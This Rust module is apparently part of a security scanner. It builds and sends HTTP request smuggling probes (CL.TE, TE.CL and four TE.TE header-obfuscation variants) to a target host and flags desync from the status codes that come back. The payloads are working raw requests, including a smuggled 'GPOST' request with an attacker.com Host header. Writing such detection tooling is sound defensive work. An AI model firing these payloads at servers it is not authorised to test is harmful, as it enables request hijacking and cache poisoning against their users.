//! HTTP Request Smuggling research module.
//!
//! Strategy pattern — each desync variant (CL.TE, TE.CL, TE.TE) is an
//! independent [`SmugglingStrategy`] implementation.  [`NoopSmuggler`] is the
//! Null Object baseline for comparison without special-casing the probe loop.
//!
//! **Educational / defensive research use only.**

use anyhow::Result;
use async_trait::async_trait;
use std::time::Duration;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::time::timeout;
use tracing::debug;
use crate::output::finding::Severity;

// ─── response wrapper ────────────────────────────────────────────────────────

/// Minimal HTTP response captured verbatim from the wire.
#[derive(Debug, Clone)]
pub struct HttpResponse {
    pub status: u16,
    pub headers: Vec<(String, String)>,
    pub body: Vec<u8>,
    pub raw: Vec<u8>,
}

impl HttpResponse {
    fn parse(raw: Vec<u8>) -> Self {
        let text = String::from_utf8_lossy(&raw);
        let status = text
            .lines()
            .next()
            .and_then(|l| l.split_whitespace().nth(1))
            .and_then(|s| s.parse::<u16>().ok())
            .unwrap_or(0);

        let mut headers = Vec::new();
        let mut body_start = raw.len();
        for (i, line) in text.lines().enumerate() {
            if i == 0 { continue; }
            if line.is_empty() {
                body_start = raw
                    .windows(4)
                    .position(|w| w == b"\r\n\r\n")
                    .map(|p| p + 4)
                    .unwrap_or(raw.len());
                break;
            }
            if let Some((k, v)) = line.split_once(':') {
                headers.push((k.trim().to_lowercase(), v.trim().to_string()));
            }
        }

        let body = raw[body_start.min(raw.len())..].to_vec();
        Self { status, headers, body, raw }
    }
}

// ─── result ──────────────────────────────────────────────────────────────────

/// Outcome of a single smuggling strategy probe.
#[derive(Debug, Clone)]
pub struct SmugglingResult {
    pub variant: &'static str,
    pub desync_detected: bool,
    pub evidence: String,
    pub severity: Severity,
}

// ─── strategy trait ──────────────────────────────────────────────────────────

/// Strategy pattern: every smuggling variant implements this trait.
#[async_trait]
pub trait SmugglingStrategy: Send + Sync {
    /// Short human-readable name (e.g. `"CL.TE"`).
    fn name(&self) -> &'static str;

    /// Build the raw bytes of a smuggled request pair.  The caller writes
    /// these verbatim to a TCP socket.
    fn build_request_pair(&self, host: &str, path: &str) -> Vec<u8>;

    /// Decide whether a desync occurred by examining the two server responses.
    fn interpret(&self, responses: &[HttpResponse]) -> SmugglingResult;
}

// ─── CL.TE ───────────────────────────────────────────────────────────────────

/// **CL.TE** desync: front-end honours `Content-Length`; back-end honours
/// `Transfer-Encoding: chunked`.  Body bytes left unconsumed by CL are
/// prepended to the *next* request seen by the back-end.
#[derive(Debug)]
pub struct ClTeSmugglingStrategy;

#[async_trait]
impl SmugglingStrategy for ClTeSmugglingStrategy {
    fn name(&self) -> &'static str { "CL.TE" }

    fn build_request_pair(&self, host: &str, path: &str) -> Vec<u8> {
        // Content-Length = 6 covers "0\r\n\r\n" but the extra "G" byte
        // remains in the back-end buffer as a prefix for the next request.
        let r1 = format!(
            "POST {path} HTTP/1.1\r\n\
             Host: {host}\r\n\
             Content-Type: application/x-www-form-urlencoded\r\n\
             Content-Length: 6\r\n\
             Transfer-Encoding: chunked\r\n\
             Connection: keep-alive\r\n\
             \r\n\
             0\r\n\
             \r\n\
             G"
        );
        // Innocent follow-up request — poisoned if desync succeeded.
        let r2 = format!(
            "GET {path} HTTP/1.1\r\n\
             Host: {host}\r\n\
             Connection: close\r\n\
             \r\n"
        );
        let mut buf = r1.into_bytes();
        buf.extend_from_slice(r2.as_bytes());
        buf
    }

    fn interpret(&self, responses: &[HttpResponse]) -> SmugglingResult {
        // Back-end would see "GGET /…" → 400/405/501.
        let desync_detected = responses
            .get(1)
            .map(|r| matches!(r.status, 400 | 405 | 501))
            .unwrap_or(false);
        let evidence = match responses.get(1) {
            Some(r) if desync_detected =>
                format!("Second response HTTP {}: back-end received smuggled prefix", r.status),
            _ => "No CL.TE desync indicators observed".to_string(),
        };
        SmugglingResult {
            variant: self.name(),
            desync_detected,
            evidence,
            severity: if desync_detected { Severity::Critical } else { Severity::Info },
        }
    }
}

// ─── TE.CL ───────────────────────────────────────────────────────────────────

/// **TE.CL** desync: front-end honours `Transfer-Encoding: chunked`;
/// back-end honours `Content-Length`.
#[derive(Debug)]
pub struct TeClSmugglingStrategy;

#[async_trait]
impl SmugglingStrategy for TeClSmugglingStrategy {
    fn name(&self) -> &'static str { "TE.CL" }

    fn build_request_pair(&self, host: &str, path: &str) -> Vec<u8> {
        let smuggled = "GPOST / HTTP/1.1\r\nHost: attacker.com\r\n\r\n";
        let chunk_hex = format!("{:x}", smuggled.len());
        // Content-Length: 4 — back-end reads 4 bytes ("5c\r\n"), leaving
        // the chunk payload as a prefix for the next request.
        let r1 = format!(
            "POST {path} HTTP/1.1\r\n\
             Host: {host}\r\n\
             Content-Type: application/x-www-form-urlencoded\r\n\
             Content-Length: 4\r\n\
             Transfer-Encoding: chunked\r\n\
             Connection: keep-alive\r\n\
             \r\n\
             {chunk_hex}\r\n\
             {smuggled}\r\n\
             0\r\n\
             \r\n"
        );
        let r2 = format!(
            "GET {path} HTTP/1.1\r\n\
             Host: {host}\r\n\
             Connection: close\r\n\
             \r\n"
        );
        let mut buf = r1.into_bytes();
        buf.extend_from_slice(r2.as_bytes());
        buf
    }

    fn interpret(&self, responses: &[HttpResponse]) -> SmugglingResult {
        let desync_detected = responses
            .get(1)
            .map(|r| matches!(r.status, 400 | 403 | 404 | 405 | 501))
            .unwrap_or(false);
        let evidence = match responses.get(1) {
            Some(r) if desync_detected =>
                format!("Second response HTTP {}: possible TE.CL desync", r.status),
            _ => "No TE.CL desync indicators".to_string(),
        };
        SmugglingResult {
            variant: self.name(),
            desync_detected,
            evidence,
            severity: if desync_detected { Severity::Critical } else { Severity::Info },
        }
    }
}

// ─── TE.TE obfuscation ───────────────────────────────────────────────────────

/// How the second `Transfer-Encoding` header is obfuscated so that one hop
/// ignores it while the other processes it.
#[derive(Debug, Clone)]
pub enum TeObfuscation {
    /// `"Transfer-Encoding : chunked"` — extra space before the colon.
    Whitespace,
    /// `"Transfer-Encoding:\tchunked"` — tab character after the colon.
    Tab,
    /// `"Transfer-Encoding: Chunked"` — mixed-case value.
    CamelCase,
    /// `"X-Transfer-Encoding: chunked"` — alternative header name.
    XHeader,
}

impl TeObfuscation {
    fn header_line(&self) -> &'static str {
        match self {
            Self::Whitespace => "Transfer-Encoding : chunked",
            Self::Tab        => "Transfer-Encoding:\tchunked",
            Self::CamelCase  => "Transfer-Encoding: Chunked",
            Self::XHeader    => "X-Transfer-Encoding: chunked",
        }
    }

    fn name(&self) -> &'static str {
        match self {
            Self::Whitespace => "TE.TE(whitespace)",
            Self::Tab        => "TE.TE(tab)",
            Self::CamelCase  => "TE.TE(camelcase)",
            Self::XHeader    => "TE.TE(x-header)",
        }
    }
}

/// **TE.TE** desync: both hops support `Transfer-Encoding`, but one ignores
/// the obfuscated variant, causing the same CL.TE / TE.CL split.
#[derive(Debug)]
pub struct TeTeSmugglingStrategy {
    pub te_variant: TeObfuscation,
}

#[async_trait]
impl SmugglingStrategy for TeTeSmugglingStrategy {
    fn name(&self) -> &'static str { self.te_variant.name() }

    fn build_request_pair(&self, host: &str, path: &str) -> Vec<u8> {
        let obfuscated = self.te_variant.header_line();
        let smuggled = "GPOST / HTTP/1.1\r\nContent-Length: 30\r\n\r\nGET /404 HTTP/1.1\r\nFoo: x\r\n\r\n";
        let chunk_hex = format!("{:x}", smuggled.len());
        let r1 = format!(
            "POST {path} HTTP/1.1\r\n\
             Host: {host}\r\n\
             Content-Type: application/x-www-form-urlencoded\r\n\
             Content-Length: 4\r\n\
             Transfer-Encoding: chunked\r\n\
             {obfuscated}\r\n\
             Connection: keep-alive\r\n\
             \r\n\
             {chunk_hex}\r\n\
             {smuggled}\r\n\
             0\r\n\
             \r\n"
        );
        let r2 = format!(
            "GET {path} HTTP/1.1\r\n\
             Host: {host}\r\n\
             Connection: close\r\n\
             \r\n"
        );
        let mut buf = r1.into_bytes();
        buf.extend_from_slice(r2.as_bytes());
        buf
    }

    fn interpret(&self, responses: &[HttpResponse]) -> SmugglingResult {
        let desync_detected = responses
            .get(1)
            .map(|r| matches!(r.status, 400..=499 | 501))
            .unwrap_or(false);
        SmugglingResult {
            variant: self.name(),
            desync_detected,
            evidence: format!(
                "TE obfuscation={} second-response={}",
                self.te_variant.name(),
                responses.get(1).map(|r| r.status).unwrap_or(0)
            ),
            severity: if desync_detected { Severity::High } else { Severity::Info },
        }
    }
}

// ─── Null Object ─────────────────────────────────────────────────────────────

/// Null Object baseline: sends an ordinary POST and never reports a desync.
/// Use it as the first strategy so every probe set has a clean reference point.
#[derive(Debug)]
pub struct NoopSmuggler;

#[async_trait]
impl SmugglingStrategy for NoopSmuggler {
    fn name(&self) -> &'static str { "NOOP" }

    fn build_request_pair(&self, host: &str, path: &str) -> Vec<u8> {
        let body = b"a=1";
        let req = format!(
            "POST {path} HTTP/1.1\r\n\
             Host: {host}\r\n\
             Content-Type: application/x-www-form-urlencoded\r\n\
             Content-Length: {len}\r\n\
             Connection: close\r\n\
             \r\n",
            len = body.len()
        );
        let mut buf = req.into_bytes();
        buf.extend_from_slice(body);
        buf
    }

    fn interpret(&self, _responses: &[HttpResponse]) -> SmugglingResult {
        SmugglingResult {
            variant: self.name(),
            desync_detected: false,
            evidence: "Baseline — no smuggling attempted".to_string(),
            severity: Severity::Info,
        }
    }
}

// ─── probe orchestrator ──────────────────────────────────────────────────────

/// Runs all registered [`SmugglingStrategy`] implementations against a target.
pub struct HttpSmugglingProbe {
    strategies: Vec<Box<dyn SmugglingStrategy>>,
    timeout_ms: u64,
}

impl HttpSmugglingProbe {
    /// Pre-loaded with every built-in strategy (Noop + CL.TE + TE.CL +
    /// four TE.TE obfuscation variants).
    pub fn all_strategies() -> Self {
        Self {
            strategies: vec![
                Box::new(NoopSmuggler),
                Box::new(ClTeSmugglingStrategy),
                Box::new(TeClSmugglingStrategy),
                Box::new(TeTeSmugglingStrategy { te_variant: TeObfuscation::Whitespace }),
                Box::new(TeTeSmugglingStrategy { te_variant: TeObfuscation::Tab }),
                Box::new(TeTeSmugglingStrategy { te_variant: TeObfuscation::CamelCase }),
                Box::new(TeTeSmugglingStrategy { te_variant: TeObfuscation::XHeader }),
            ],
            timeout_ms: 10_000,
        }
    }

    /// Override the per-strategy socket timeout.
    pub fn with_timeout_ms(mut self, ms: u64) -> Self {
        self.timeout_ms = ms;
        self
    }

    /// Run every strategy against `host:port/path` and return one result per strategy.
    pub async fn probe(
        &self,
        host: &str,
        port: u16,
        path: &str,
    ) -> Result<Vec<SmugglingResult>> {
        let mut results = Vec::with_capacity(self.strategies.len());
        for strategy in &self.strategies {
            debug!("smuggling probe: variant={} host={}:{}", strategy.name(), host, port);
            let raw_pair = strategy.build_request_pair(host, path);
            let responses = self.send_and_collect(host, port, &raw_pair).await?;
            let result = strategy.interpret(&responses);
            debug!("smuggling result: variant={} desync={}", result.variant, result.desync_detected);
            results.push(result);
        }
        Ok(results)
    }

    async fn send_and_collect(
        &self,
        host: &str,
        port: u16,
        data: &[u8],
    ) -> Result<Vec<HttpResponse>> {
        let addr = format!("{host}:{port}");
        let deadline = Duration::from_millis(self.timeout_ms);

        let mut stream = timeout(deadline, TcpStream::connect(&addr)).await??;
        timeout(deadline, stream.write_all(data)).await??;

        let mut responses = Vec::new();
        for _ in 0..2 {
            match timeout(deadline, read_http_response(&mut stream)).await {
                Ok(Ok(raw)) => responses.push(HttpResponse::parse(raw)),
                _ => break,
            }
        }
        Ok(responses)
    }
}

/// Read one HTTP/1.1 response from `stream`, honouring `Content-Length`.
async fn read_http_response(stream: &mut TcpStream) -> Result<Vec<u8>> {
    let mut buf = Vec::with_capacity(4096);
    let mut tmp = [0u8; 1024];

    // Read until blank line (end of headers).
    loop {
        let n = stream.read(&mut tmp).await?;
        if n == 0 { break; }
        buf.extend_from_slice(&tmp[..n]);
        if buf.windows(4).any(|w| w == b"\r\n\r\n") { break; }
    }

    // Determine how many body bytes remain.
    let header_text = String::from_utf8_lossy(&buf);
    let content_length: usize = header_text
        .lines()
        .find(|l| l.to_ascii_lowercase().starts_with("content-length:"))
        .and_then(|l| l.split(':').nth(1))
        .and_then(|v| v.trim().parse().ok())
        .unwrap_or(0);

    let header_end = buf
        .windows(4)
        .position(|w| w == b"\r\n\r\n")
        .map(|p| p + 4)
        .unwrap_or(buf.len());

    let body_received = buf.len().saturating_sub(header_end);
    let remaining = content_length.saturating_sub(body_received);
    if remaining > 0 {
        let mut body_buf = vec![0u8; remaining];
        stream.read_exact(&mut body_buf).await?;
        buf.extend_from_slice(&body_buf);
    }

    Ok(buf)
}

// ─── unit tests ───────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn cl_te_name_is_nonempty() {
        assert!(!ClTeSmugglingStrategy.name().is_empty());
        assert_eq!(ClTeSmugglingStrategy.name(), "CL.TE");
    }

    #[test]
    fn te_cl_request_pair_contains_transfer_encoding() {
        let bytes = TeClSmugglingStrategy.build_request_pair("example.com", "/");
        let text = String::from_utf8(bytes).expect("valid UTF-8");
        assert!(text.contains("Transfer-Encoding"));
    }

    #[test]
    fn te_te_whitespace_variant_contains_space_before_colon() {
        let s = TeTeSmugglingStrategy { te_variant: TeObfuscation::Whitespace };
        let bytes = s.build_request_pair("example.com", "/");
        let text = String::from_utf8(bytes).expect("valid UTF-8");
        assert!(text.contains("Transfer-Encoding :"), "space before colon expected");
    }

    #[test]
    fn noop_produces_valid_utf8_post_request() {
        let bytes = NoopSmuggler.build_request_pair("example.com", "/health");
        let text = String::from_utf8(bytes).expect("noop must be valid UTF-8");
        assert!(text.starts_with("POST"));
        assert!(text.contains("HTTP/1.1"));
        assert!(text.contains("example.com"));
    }

    #[test]
    fn noop_interpret_never_reports_desync() {
        let result = NoopSmuggler.interpret(&[]);
        assert!(!result.desync_detected);
        assert_eq!(result.variant, "NOOP");
    }

    #[test]
    fn cl_te_detects_desync_on_400_second_response() {
        let r1 = HttpResponse { status: 200, headers: vec![], body: vec![], raw: vec![] };
        let r2 = HttpResponse { status: 400, headers: vec![], body: vec![], raw: vec![] };
        let result = ClTeSmugglingStrategy.interpret(&[r1, r2]);
        assert!(result.desync_detected);
        assert_eq!(result.severity, Severity::Critical);
    }

    #[test]
    fn te_te_camelcase_name_contains_label() {
        let s = TeTeSmugglingStrategy { te_variant: TeObfuscation::CamelCase };
        assert!(s.name().contains("camelcase"));
    }

    #[test]
    fn all_strategies_loads_seven_variants() {
        let probe = HttpSmugglingProbe::all_strategies();
        assert_eq!(probe.strategies.len(), 7);
    }
}
